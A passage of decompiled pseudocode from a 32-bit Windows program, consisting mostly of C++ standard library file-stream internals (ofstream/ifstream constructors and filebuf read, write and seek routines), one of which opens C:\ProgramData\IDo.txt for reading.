  int v6; // eax
  char *v7; // ebx
  char v8; // al
  bool v9; // zf
  FILE *v10; // eax
  _DWORD *v11; // ebx
  void (__thiscall ***v12)(_DWORD, int); // eax
  char v14[4]; // [esp+14h] [ebp-1Ch] BYREF
  _DWORD *v15; // [esp+18h] [ebp-18h]
  _DWORD *v16; // [esp+1Ch] [ebp-14h]
  int v17; // [esp+20h] [ebp-10h]
  int v18; // [esp+2Ch] [ebp-4h]

  v16 = this;
  v17 = 0;
  *this = &unk_4CF3F0;
  v15 = this + 26;
  this[26] = &std::ios_base::`vftable';
  this[26] = &std::ios::`vftable';
  v18 = 1;
  v6 = *this;
  v17 = 1;
  *(_DWORD *)((char *)this + *(_DWORD *)(v6 + 4)) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  v7 = (char *)this + *(_DWORD *)(*this + 4);
  sub_4037C0(v7);
  *((_DWORD *)v7 + 15) = 0;
  *((_DWORD *)v7 + 14) = this + 1;
  v8 = sub_421590(v7, 32);
  v9 = *((_DWORD *)v7 + 14) == 0;
  v7[64] = v8;
  if ( v9 )
    sub_4036A0(v7, *((_DWORD *)v7 + 3) | 4, 0);
  v18 = 4;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 104;
  sub_41FB20(this + 1, 0);
  LOBYTE(v18) = 5;
  if ( this[20] || (v10 = sub_46A575(a2, 42, 64)) == 0 )
  {
    sub_4036A0(
      (_DWORD *)((char *)this + *(_DWORD *)(*this + 4)),
      *((_BYTE *)this + *(_DWORD *)(*this + 4) + 12) | (4
                                                      * (*(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) + 56) == 0)
                                                      + 2),
      0);
  }
  else
  {
    sub_41F820((int)(this + 1), v10, 1);
    LOBYTE(v18) = 6;
    v15 = *(_DWORD **)(this[14] + 4);
    (*(void (**)(void))(*v15 + 4))();
    v17 = 5;
    v11 = sub_4245E0((int)v14);
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*v11 + 12))(v11) )
    {
      this[15] = 0;
    }
    else
    {
      this[15] = v11;
      sub_4210E0(this + 1);
    }
    v17 = 1;
    LOBYTE(v18) = 5;
    if ( v15 )
    {
      v12 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(_DWORD *))(*v15 + 8))(v15);
      if ( v12 )
        (**v12)(v12, 1);
    }
  }
  return this;
}
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4BBFB8: using guessed type void *std::ofstream::`vftable';
// 41B100: using guessed type char var_1C[4];

//----- (0041B2C0) --------------------------------------------------------
_DWORD *__thiscall sub_41B2C0(_DWORD *this, char *a2, int a3, int a4, int a5)
{
  char *v6; // edi
  char v7; // al
  bool v8; // zf

  *this = &unk_4CF3F0;
  this[26] = &std::ios_base::`vftable';
  this[26] = &std::ios::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  v6 = (char *)this + *(_DWORD *)(*this + 4);
  sub_4037C0(v6);
  *((_DWORD *)v6 + 15) = 0;
  *((_DWORD *)v6 + 14) = this + 1;
  v7 = sub_421590(v6, 32);
  v8 = *((_DWORD *)v6 + 14) == 0;
  v6[64] = v7;
  if ( v8 )
    sub_4036A0(v6, *((_DWORD *)v6 + 3) | 4, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 104;
  sub_41FB20(this + 1, 0);
  if ( !sub_41FA20(this + 1, a2, 2, 64) )
    sub_4036A0(
      (_DWORD *)((char *)this + *(_DWORD *)(*this + 4)),
      *((_BYTE *)this + *(_DWORD *)(*this + 4) + 12) | (4
                                                      * (*(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) + 56) == 0)
                                                      + 2),
      0);
  return this;
}
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4BBFB8: using guessed type void *std::ofstream::`vftable';

//----- (0041B400) --------------------------------------------------------
int __thiscall sub_41B400(FILE **this)
{
  FILE **v2; // edi
  int result; // eax

  if ( this[23] )
  {
    v2 = this + 4;
    if ( !sub_41F760(this + 4) )
      v2 = 0;
    if ( fclose(this[23]) )
      v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  result = sub_41F820((int)(this + 4), 0, 2);
  if ( !v2 )
    return sub_4036A0(
             (FILE **)((char *)this + (*this)->_cnt),
             *((_BYTE *)this + (*this)->_cnt + 12) | (4 * (*(FILE **)((char *)this + (*this)->_cnt + 56) == 0) + 2),
             0);
  return result;
}

//----- (0041B470) --------------------------------------------------------
_DWORD *__thiscall sub_41B470(_DWORD *this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  char *v7; // edi
  char v8; // al
  bool v9; // zf

  *this = &unk_4CF2AC;
  this[28] = &std::ios_base::`vftable';
  this[28] = &std::ios::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 24;
  v6 = *this;
  this[2] = 0;
  this[3] = 0;
  v7 = (char *)this + *(_DWORD *)(v6 + 4);
  sub_4037C0(v7);
  *((_DWORD *)v7 + 15) = 0;
  *((_DWORD *)v7 + 14) = this + 4;
  v8 = sub_421590(v7, 32);
  v9 = *((_DWORD *)v7 + 14) == 0;
  v7[64] = v8;
  if ( v9 )
    sub_4036A0(v7, *((_DWORD *)v7 + 3) | 4, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ifstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 112;
  sub_41FB20(this + 4, 0);
  if ( !sub_41FA20(this + 4, "C:\\ProgramData\\IDo.txt", 1, 64) )
    sub_4036A0(
      (_DWORD *)((char *)this + *(_DWORD *)(*this + 4)),
      *((_BYTE *)this + *(_DWORD *)(*this + 4) + 12) | (4
                                                      * (*(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) + 56) == 0)
                                                      + 2),
      0);
  return this;
}
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B8640: using guessed type void *std::istream::`vftable';
// 4BBF88: using guessed type void *std::ifstream::`vftable';

//----- (0041B5C0) --------------------------------------------------------
_DWORD *__thiscall sub_41B5C0(_DWORD *this, int a2)
{
  _DWORD *v3; // edi
  _DWORD *result; // eax

  v3 = sub_4245E0(a2);
  result = (_DWORD *)(*(int (__thiscall **)(_DWORD *))(*v3 + 12))(v3);
  if ( (_BYTE)result )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = v3;
    return sub_4210E0(this);
  }
  return result;
}

//----- (0041B600) --------------------------------------------------------
int __thiscall sub_41B600(FILE **this)
{
  if ( !this[19] || ((int (__thiscall *)(FILE **, int))(*this)->_flag)(this, -1) == -1 || fflush(this[19]) >= 0 )
    return 0;
  else
    return -1;
}

//----- (0041B630) --------------------------------------------------------
FILE **__thiscall sub_41B630(FILE **this, char *Buffer, __int64 Size)
{
  FILE *v4; // ecx
  int v5; // eax

  v4 = this[19];
  if ( !v4 )
    return 0;
  v5 = Buffer || Size ? 0 : 4;
  if ( setvbuf(v4, Buffer, v5, Size) )
    return 0;
  sub_41F820((int)this, this[19], 1);
  return this;
}

//----- (0041B680) --------------------------------------------------------
int __thiscall sub_41B680(int this, int a2, __int64 a3, __int64 a4, int a5, int a6, int a7)
{
  _DWORD *v8; // ebx
  int v9; // ecx
  int v10; // edx
  int v11; // edx
  int v12; // esi
  fpos_t Position; // [esp+10h] [ebp-10h] BYREF

  Position = a4 + a3;
  if ( *(_DWORD *)(this + 76) && sub_41F760((void *)this) && !fsetpos(*(FILE **)(this + 76), &Position) )
  {
    v8 = *(_DWORD **)(this + 12);
    *(_DWORD *)(this + 64) = a5;
    *(_DWORD *)(this + 68) = a6;
    if ( *v8 == this + 60 )
    {
      v9 = *(_DWORD *)(this + 80);
      v10 = *(_DWORD *)(this + 84) - v9;
      *v8 = v9;
      **(_DWORD **)(this + 28) = v9;
      **(_DWORD **)(this + 44) = v10;
    }
    v11 = *(_DWORD *)(this + 64);
    v12 = *(_DWORD *)(this + 68);
    *(_QWORD *)a2 = Position;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_DWORD *)(a2 + 16) = v11;
    *(_DWORD *)(a2 + 20) = v12;
  }
  else
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  return a2;
}

//----- (0041B760) --------------------------------------------------------
int __thiscall sub_41B760(int this, int a2, __int64 a3, int Origin, int a5)
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  _DWORD *v8; // eax
  int v9; // ecx
  int v10; // edx
  int v11; // edx
  int v12; // esi
  unsigned int v14; // [esp+Ch] [ebp-14h]
  fpos_t Position; // [esp+10h] [ebp-10h] BYREF

  if ( **(_DWORD **)(this + 28) == this + 60 && Origin == 1 && !*(_DWORD *)(this + 56) )
  {
    v6 = (unsigned __int64)(a3 - 1) >> 32;
    v7 = a3 - 1;
  }
  else
  {
    v6 = HIDWORD(a3);
    v7 = a3;
  }
  v14 = v6;
  if ( !*(_DWORD *)(this + 76)
    || !sub_41F760((void *)this)
    || (__PAIR64__(v7, v14) || Origin != 1) && _fseeki64(*(FILE **)(this + 76), __SPAIR64__(v14, v7), Origin)
    || fgetpos(*(FILE **)(this + 76), &Position) )
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  else
  {
    v8 = *(_DWORD **)(this + 12);
    if ( *v8 == this + 60 )
    {
      v9 = *(_DWORD *)(this + 80);
      v10 = *(_DWORD *)(this + 84) - v9;
      *v8 = v9;
      **(_DWORD **)(this + 28) = v9;
      **(_DWORD **)(this + 44) = v10;
    }
    v11 = *(_DWORD *)(this + 64);
    v12 = *(_DWORD *)(this + 68);
    *(_QWORD *)a2 = Position;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_DWORD *)(a2 + 16) = v11;
    *(_DWORD *)(a2 + 20) = v12;
  }
  return a2;
}

//----- (0041B880) --------------------------------------------------------
size_t __thiscall sub_41B880(int this, char *a2, __int64 a3)
{
  int v3; // ebx
  int v4; // edx
  size_t v5; // edi
  __int64 v6; // rax
  size_t v7; // esi
  bool v8; // cf
  int v10; // edi
  size_t v11; // esi
  int v12; // eax
  size_t v13; // ebx
  int v14; // eax
  char *v15; // edx
  int v16; // [esp+Ch] [ebp-14h]
  unsigned __int8 *Src; // [esp+10h] [ebp-10h]
  void *Srca; // [esp+10h] [ebp-10h]
  int v19; // [esp+14h] [ebp-Ch]
  int v20; // [esp+14h] [ebp-Ch]

  v16 = this;
  if ( *(_DWORD *)(this + 56) )
  {
    v3 = HIDWORD(a3);
    v4 = a3;
    v5 = a3;
    Src = (unsigned __int8 *)a2;
    if ( a3 > 0 )
    {
      do
      {
        v6 = sub_41F6F0((_DWORD **)this);
        v19 = HIDWORD(v6);
        v7 = v6;
        if ( v6 <= 0 )
        {
          if ( (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v16 + 12))(v16, *Src) == -1 )
            break;
          this = v16;
          v8 = v5-- != 0;
          v7 = 1;
          v3 = v8 + v3 - 1;
        }
        else
        {
          if ( __SPAIR64__(v3, v5) < v6 )
          {
            v7 = v5;
            v19 = v3;
          }
          memmove(**(void ***)(v16 + 32), Src, v7);
          this = v16;
          v3 = (__PAIR64__(v3, v5) - __PAIR64__(v19, v7)) >> 32;
          v5 -= v7;
          **(_DWORD **)(v16 + 48) -= v7;
          **(_DWORD **)(v16 + 32) += v7;
        }
        Src += v7;
      }
      while ( v3 > 0 || v3 >= 0 && v5 );
      v4 = a3;
    }
    return v4 - v5;
  }
  else
  {
    v10 = HIDWORD(a3);
    v11 = a3;
    Srca = **(void ***)(this + 32);
    if ( Srca )
      v12 = **(_DWORD **)(this + 48);
    else
      v12 = 0;
    v13 = v12;
    v14 = v12 >> 31;
    v20 = v14;
    if ( a3 > 0 )
    {
      if ( v14 >= 0 && (v14 > 0 || v13) )
      {
        if ( a3 < __SPAIR64__(v14, v13) )
        {
          v20 = HIDWORD(a3);
          v13 = a3;
        }
        memmove(Srca, a2, v13);
        this = v16;
        v15 = &a2[v13];
        v10 = (a3 - __PAIR64__(v20, v13)) >> 32;
        v11 = a3 - v13;
        **(_DWORD **)(v16 + 48) -= v13;
        **(_DWORD **)(v16 + 32) += v13;
      }
      else
      {
        v15 = a2;
      }
      if ( v10 >= 0 && (v10 > 0 || v11) && *(_DWORD *)(this + 76) )
        v11 -= fwrite(v15, 1u, v11, *(FILE **)(this + 76));
    }
    return a3 - v11;
  }
}

//----- (0041BA20) --------------------------------------------------------
size_t __thiscall sub_41BA20(int this, char *a2, __int64 a3)
{
  int v3; // ebx
  int v4; // edx
  size_t v5; // edi
  __int64 v6; // rax
  size_t v7; // esi
  _BYTE *v8; // eax
  int v9; // eax
  char v10; // cl
  bool v11; // cf
  int v13; // edi
  size_t v14; // esi
  int v15; // eax
  size_t v16; // ebx
  int v17; // eax
  FILE *v18; // edx
  _DWORD *v19; // ebx
  int v20; // edx
  int v21; // ecx
  int v22; // [esp+Ch] [ebp-14h]
  _BYTE *Src; // [esp+10h] [ebp-10h]
  void *Srca; // [esp+10h] [ebp-10h]
  char *Srcb; // [esp+10h] [ebp-10h]
  int v26; // [esp+14h] [ebp-Ch]
  int v27; // [esp+14h] [ebp-Ch]

  v22 = this;
  if ( *(_DWORD *)(this + 56) )
  {
    v3 = HIDWORD(a3);
    v4 = a3;
    v5 = a3;
    Src = a2;
    if ( a3 > 0 )
    {
      do
      {
        v6 = sub_41F710((_DWORD **)this);
        v26 = HIDWORD(v6);
        v7 = v6;
        if ( v6 <= 0 )
        {
          v9 = (*(int (__thiscall **)(int))(*(_DWORD *)v22 + 28))(v22);
          v10 = v9;
          if ( v9 == -1 )
            break;
          v8 = Src;
          v11 = v5-- != 0;
          v7 = 1;
          v3 = v11 + v3 - 1;
          *Src = v10;
          this = v22;
        }
        else
        {
          if ( __SPAIR64__(v3, v5) < v6 )
          {
            v7 = v5;
            v26 = v3;
          }
          memmove(Src, **(const void ***)(v22 + 28), v7);
          this = v22;
          v3 = (__PAIR64__(v3, v5) - __PAIR64__(v26, v7)) >> 32;
          v5 -= v7;
          **(_DWORD **)(v22 + 44) -= v7;
          **(_DWORD **)(v22 + 28) += v7;
          v8 = Src;
        }
        Src = &v8[v7];
      }
      while ( v3 > 0 || v3 >= 0 && v5 );
      v4 = a3;
    }
    return v4 - v5;
  }
  else
  {
    v13 = HIDWORD(a3);
    v14 = a3;
    Srca = **(void ***)(this + 28);
    if ( Srca )
      v15 = **(_DWORD **)(this + 44);
    else
      v15 = 0;
    v16 = v15;
    v17 = v15 >> 31;
    v27 = v17;
    if ( a3 > 0 )
    {
      if ( v17 >= 0 && (v17 > 0 || v16) )
      {
        if ( a3 < __SPAIR64__(v17, v16) )
        {
          v27 = HIDWORD(a3);
          v16 = a3;
        }
        memmove(a2, Srca, v16);
        this = v22;
        Srcb = &a2[v16];
        v13 = (a3 - __PAIR64__(v27, v16)) >> 32;
        v14 = a3 - v16;
        **(_DWORD **)(v22 + 44) -= v16;
        **(_DWORD **)(v22 + 28) += v16;
      }
      else
      {
        Srcb = a2;
      }
      if ( v13 >= 0 && (v13 > 0 || v14) )
      {
        v18 = *(FILE **)(this + 76);
        if ( v18 )
        {
          v19 = *(_DWORD **)(this + 12);
          if ( *v19 == this + 60 )
          {
            v20 = *(_DWORD *)(this + 84);
            v21 = *(_DWORD *)(this + 80);
            *v19 = v21;
            **(_DWORD **)(v22 + 28) = v21;
            **(_DWORD **)(v22 + 44) = v20 - v21;
            v18 = *(FILE **)(v22 + 76);
          }
          v14 -= fread(Srcb, 1u, v14, v18);
        }
      }
    }
    return a3 - v14;
  }
}

//----- (0041BC00) --------------------------------------------------------
int __thiscall sub_41BC00(int this)
{
  int v1; // ebx
  unsigned int v2; // ecx
  _DWORD *v3; // edx
  _DWORD *v4; // ecx
  unsigned __int8 *v5; // edx
  int result; // eax
  _DWORD *v7; // esi
  int v8; // ecx
  int v9; // edx
  int v10; // eax
  char v11; // dl
  unsigned int v12; // ecx
  void **v13; // eax
  int v14; // ebx
  void **v15; // ecx
  void **v16; // edi
  char *v17; // ecx
  int v18; // eax
  void **v19; // eax
  void **v20; // edx
  unsigned int v21; // edi
  unsigned int v22; // eax
  int v23; // eax
  int v24; // esi
  void *v25; // ecx
  int v26; // ecx
  int v27; // esi
  int v28; // eax
  void **v29; // eax
  int v30; // [esp+10h] [ebp-44h]
  int v31; // [esp+14h] [ebp-40h]
  char *v33; // [esp+1Ch] [ebp-38h] BYREF
  int v34; // [esp+20h] [ebp-34h] BYREF
  int v35; // [esp+24h] [ebp-30h]
  void *v36[4]; // [esp+28h] [ebp-2Ch] BYREF
  unsigned int v37; // [esp+38h] [ebp-1Ch]
  unsigned int v38; // [esp+3Ch] [ebp-18h]
  unsigned __int8 v39; // [esp+43h] [ebp-11h] BYREF
  int v40; // [esp+44h] [ebp-10h] BYREF
  int v41; // [esp+50h] [ebp-4h]

  v1 = this;
  v2 = **(_DWORD **)(this + 28);
  if ( v2 )
  {
    v3 = *(_DWORD **)(v1 + 44);
    if ( v2 < *v3 + v2 )
    {
      --*v3;
      v4 = *(_DWORD **)(v1 + 28);
      v5 = (unsigned __int8 *)(*v4)++;
      return *v5;
    }
  }
  if ( !*(_DWORD *)(v1 + 76) )
    return -1;
  v7 = *(_DWORD **)(v1 + 12);
  if ( *v7 == v1 + 60 )
  {
    v8 = *(_DWORD *)(v1 + 80);
    v9 = *(_DWORD *)(v1 + 84) - v8;
    *v7 = v8;
    **(_DWORD **)(v1 + 28) = v8;
    **(_DWORD **)(v1 + 44) = v9;
  }
  if ( *(_DWORD *)(v1 + 56) )
  {
    v37 = 0;
    v38 = 15;
    LOBYTE(v36[0]) = 0;
    v41 = 0;
    v10 = fgetc(*(FILE **)(v1 + 76));
    v11 = v10;
    if ( v10 != -1 )
    {
      v30 = v1 + 64;
      do
      {
        v12 = v37;
        LOBYTE(v35) = v11;
        if ( v37 >= v38 )
        {
          LOBYTE(v31) = 0;
          sub_424B40(v36, v37, v31, v35);
        }
        else
        {
          ++v37;
          v13 = v36;
          if ( v38 >= 0x10 )
            v13 = (void **)v36[0];
          *((_BYTE *)v13 + v12) = v11;
          *((_BYTE *)v13 + v12 + 1) = 0;
        }
        v14 = *(_DWORD *)(v1 + 56);
        v15 = v36;
        if ( v38 >= 0x10 )
          v15 = (void **)v36[0];
        v16 = v36;
        v17 = (char *)v15 + v37;
        if ( v38 >= 0x10 )
          v16 = (void **)v36[0];
        v18 = (*(int (__thiscall **)(int, int, void **, char *, int *, unsigned __int8 *, int *, char **))(*(_DWORD *)v14 + 24))(
                v14,
                v30,
                v16,
                v17,
                &v34,
                &v39,
                &v40,
                &v33);
        if ( v18 < 0 )
          break;
        if ( v18 > 1 )
        {
          if ( v18 != 3 )
            break;
          v29 = v36;
          if ( v38 >= 0x10 )
            v29 = (void **)v36[0];
          v24 = *(char *)v29;
          goto LABEL_33;
        }
        v19 = v36;
        if ( v33 != (char *)&v39 )
        {
          if ( v38 >= 0x10 )
            v19 = (void **)v36[0];
          v26 = v34;
          v27 = (int)v19 + v37 - v34;
          if ( v27 > 0 )
          {
            while ( 1 )
            {
              v28 = *(char *)(v27 + v26 - 1);
              --v27;
              ungetc(v28, *(FILE **)(this + 76));
              if ( v27 <= 0 )
                break;
              v26 = v34;
            }
          }
          v24 = v39;
          goto LABEL_33;
        }
        v20 = v36;
        if ( v38 >= 0x10 )
          v19 = (void **)v36[0];
        v21 = v34 - (_DWORD)v19;
        v22 = v37;
        if ( v37 < v21 )
          v21 = v37;
        if ( v38 >= 0x10 )
          v20 = (void **)v36[0];
        v37 -= v21;
        memmove_0(v20, (char *)v20 + v21, v22 - v21 + 1);
        v1 = this;
        v23 = fgetc(*(FILE **)(this + 76));
        v11 = v23;
      }
      while ( v23 != -1 );
    }
    v24 = -1;
LABEL_33:
    v41 = -1;
    if ( v38 >= 0x10 )
    {
      v25 = v36[0];
      if ( v38 + 1 >= 0x1000 )
      {
        v25 = (void *)*((_DWORD *)v36[0] - 1);
        if ( (unsigned int)(v36[0] - v25 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v25);
    }
    v37 = 0;
    result = v24;
    v38 = 15;
    LOBYTE(v36[0]) = 0;
  }
  else
  {
    result = fgetc(*(FILE **)(v1 + 76));
    if ( result == -1 )
      return -1;
    return (unsigned __int8)result;
  }
  return result;
}
// 41BD25: variable 'v31' is possibly undefined

//----- (0041BEA0) --------------------------------------------------------
int __thiscall sub_41BEA0(_DWORD **this)
{
  unsigned __int8 *v2; // ecx
  int result; // eax
  int v4; // edi

  v2 = (unsigned __int8 *)*this[7];
  if ( v2 && v2 < &v2[*this[11]] )
    return *v2;
  result = ((int (__thiscall *)(_DWORD **))(*this)[7])(this);
  v4 = result;
  if ( result != -1 )
  {
    ((void (__thiscall *)(_DWORD **, int))(*this)[4])(this, result);
    return v4;
  }
  return result;
}

//----- (0041BEE0) --------------------------------------------------------
int __thiscall sub_41BEE0(int this, int a2)
{
  int v2; // ebx
  unsigned int v4; // ecx
  _DWORD *v6; // ecx
  _BYTE *v7; // edx
  _DWORD *v8; // edi

  v2 = a2;
  v4 = **(_DWORD **)(this + 28);
  if ( v4 && **(_DWORD **)(this + 12) < v4 && (a2 == -1 || *(unsigned __int8 *)(v4 - 1) == a2) )
  {
    ++**(_DWORD **)(this + 44);
    --**(_DWORD **)(this + 28);
    if ( a2 == -1 )
      return 0;
    return v2;
  }
  if ( !*(_DWORD *)(this + 76) || a2 == -1 )
    return -1;
  if ( !*(_DWORD *)(this + 56) && ungetc((unsigned __int8)a2, *(FILE **)(this + 76)) != -1 )
    return v2;
  v6 = *(_DWORD **)(this + 28);
  v7 = (_BYTE *)(this + 60);
  if ( *v6 == this + 60 )
    return -1;
  v8 = *(_DWORD **)(this + 12);
  *v7 = a2;
  if ( (_BYTE *)*v8 != v7 )
  {
    *(_DWORD *)(this + 80) = *v8;
    *(_DWORD *)(this + 84) = *v6 + **(_DWORD **)(this + 44);
  }
  *v8 = v7;
  **(_DWORD **)(this + 28) = v7;
  **(_DWORD **)(this + 44) = 1;
  return a2;
}

//----- (0041BF90) --------------------------------------------------------
int __thiscall sub_41BF90(int this, int a2)
{
  unsigned int v4; // ecx
  _DWORD *v5; // edx
  _DWORD *v6; // edx
  _BYTE *v7; // esi
  _DWORD *v8; // edi
  int v9; // ecx
  int v10; // edx
  int v11; // ecx
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  bool v15; // al
  int v16; // ecx
  int v17; // edi
  char *v18; // [esp+8h] [ebp-30h] BYREF
  char *v19; // [esp+Ch] [ebp-2Ch] BYREF
  char v20; // [esp+10h] [ebp-28h] BYREF
  _BYTE v21[3]; // [esp+11h] [ebp-27h] BYREF
  char Buffer[32]; // [esp+14h] [ebp-24h] BYREF
  int v23; // [esp+34h] [ebp-4h] BYREF

  if ( a2 == -1 )
    return 0;
  v4 = **(_DWORD **)(this + 32);
  if ( v4 )
  {
    v5 = *(_DWORD **)(this + 48);
    if ( v4 < *v5 + v4 )
    {
      --*v5;
      v6 = *(_DWORD **)(this + 32);
      v7 = (_BYTE *)(*v6)++;
      *v7 = a2;
      return a2;
    }
  }
  if ( !*(_DWORD *)(this + 76) )
    return -1;
  v8 = *(_DWORD **)(this + 12);
  if ( *v8 == this + 60 )
  {
    v9 = *(_DWORD *)(this + 80);
    v10 = *(_DWORD *)(this + 84) - v9;
    *v8 = v9;
    **(_DWORD **)(this + 28) = v9;
    **(_DWORD **)(this + 44) = v10;
  }
  v11 = *(_DWORD *)(this + 56);
  if ( !v11 )
  {
    v12 = fputc((char)a2, *(FILE **)(this + 76));
    v13 = -1;
    if ( v12 != -1 )
      return a2;
    return v13;
  }
  v20 = a2;
  v14 = (*(int (__thiscall **)(int, int, char *, _BYTE *, char **, char *, int *, char **))(*(_DWORD *)v11 + 28))(
          v11,
          this + 64,
          &v20,
          v21,
          &v18,
          Buffer,
          &v23,
          &v19);
  if ( v14 < 0 )
    return -1;
  if ( v14 <= 1 )
  {
    if ( v19 == Buffer || (v17 = v19 - Buffer, v17 == fwrite(Buffer, 1u, v19 - Buffer, *(FILE **)(this + 76))) )
    {
      *(_BYTE *)(this + 61) = 1;
      if ( v18 != &v20 )
        return a2;
    }
    return -1;
  }
  if ( v14 != 3 )
    return -1;
  v15 = sub_403AF0(v20, *(FILE **)(this + 76));
  v16 = -1;
  if ( v15 )
    return a2;
  return v16;
}

//----- (0041C100) --------------------------------------------------------
void __thiscall sub_41C100(int this)
{
  _DWORD *v2; // edi
  int v3; // edx
  int v4; // ecx
  _DWORD *v5; // esi
  int v6; // ecx
  void (__thiscall ***v7)(_DWORD, int); // eax

  *(_DWORD *)this = &std::filebuf::`vftable';
  if ( *(_DWORD *)(this + 76) )
  {
    v2 = *(_DWORD **)(this + 12);
    if ( *v2 == this + 60 )
    {
      v3 = *(_DWORD *)(this + 84);
      v4 = *(_DWORD *)(this + 80);
      *v2 = v4;
      **(_DWORD **)(this + 28) = v4;
      **(_DWORD **)(this + 44) = v3 - v4;
    }
  }
  if ( *(_BYTE *)(this + 72) )
  {
    if ( *(_DWORD *)(this + 76) )
    {
      sub_41F760((void *)this);
      fclose(*(FILE **)(this + 76));
    }
    sub_41F820(this, 0, 2);
  }
  *(_DWORD *)this = &std::streambuf::`vftable';
  v5 = *(_DWORD **)(this + 52);
  if ( v5 )
  {
    v6 = v5[1];
    if ( v6 )
    {
      v7 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v6 + 8))(v6);
      if ( v7 )
        (**v7)(v7, 1);
    }
    sub_46C87D(v5);
  }
}
// 4B8584: using guessed type void *std::streambuf::`vftable';
// 4BBF48: using guessed type void *std::filebuf::`vftable';

//----- (0041C1D0) --------------------------------------------------------
int *__thiscall sub_41C1D0(int *this, int a2, __int64 a3)
{
  char v4; // di
  int v5; // ecx
  int v6; // ecx
  int v7; // eax
  int *v8; // ecx
  int v9; // eax
  int v10; // edx
  _BYTE *v11; // ecx
  char v12; // al
  int v13; // ecx
  _DWORD v15[6]; // [esp+0h] [ebp-34h] BYREF
  bool v16; // [esp+18h] [ebp-1Ch]
  int v17; // [esp+1Ch] [ebp-18h]
  int *v18; // [esp+20h] [ebp-14h]
  _DWORD *v19; // [esp+24h] [ebp-10h]
  int v20; // [esp+30h] [ebp-4h]

  v19 = v15;
  v18 = this;
  v4 = 0;
  v17 = 0;
  v15[5] = this;
  v5 = *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56);
  if ( v5 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  v20 = 0;
  v6 = *(_DWORD *)(*this + 4);
  v7 = *this;
  if ( !*(int *)((char *)this + v6 + 12) )
  {
    v8 = *(int **)((char *)this + v6 + 60);
    if ( v8 )
    {
      if ( v8 != this )
      {
        sub_4212B0(v8);
        v7 = *this;
      }
    }
  }
  v9 = *(int *)((char *)this + *(_DWORD *)(v7 + 4) + 12);
  v16 = v9 == 0;
  v20 = 1;
  if ( v9 )
  {
    v4 = 4;
  }
  else if ( a3 > 0 )
  {
    LOBYTE(v20) = 2;
    if ( sub_41FD90(*(void **)((char *)this + *(_DWORD *)(*this + 4) + 56), a2, a3, SHIDWORD(a3)) != (_DWORD)a3
      || v10 != HIDWORD(a3) )
    {
      v4 = 4;
      v17 = 4;
    }
    v20 = 1;
  }
  v11 = (char *)this + *(_DWORD *)(*this + 4);
  v12 = v4 | v11[12] | 4;
  if ( *((_DWORD *)v11 + 14) )
    v12 = v4 | v11[12];
  sub_4036A0(v11, v12, 0);
  v20 = 4;
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_421050(this);
  v20 = -1;
  v13 = *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56);
  if ( v13 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v13 + 8))(v13);
  return this;
}
// 41C28F: variable 'v10' is possibly undefined
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (0041C350) --------------------------------------------------------
int __thiscall sub_41C350(_DWORD *this)
{
  int v1; // edx
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 6) + 4) - 24) = &std::istream::`vftable';
  v1 = *(_DWORD *)(*(this - 6) + 4);
  result = v1 - 24;
  *(_DWORD *)((char *)this + v1 - 28) = v1 - 24;
  return result;
}
// 4B8640: using guessed type void *std::istream::`vftable';

//----- (0041C370) --------------------------------------------------------
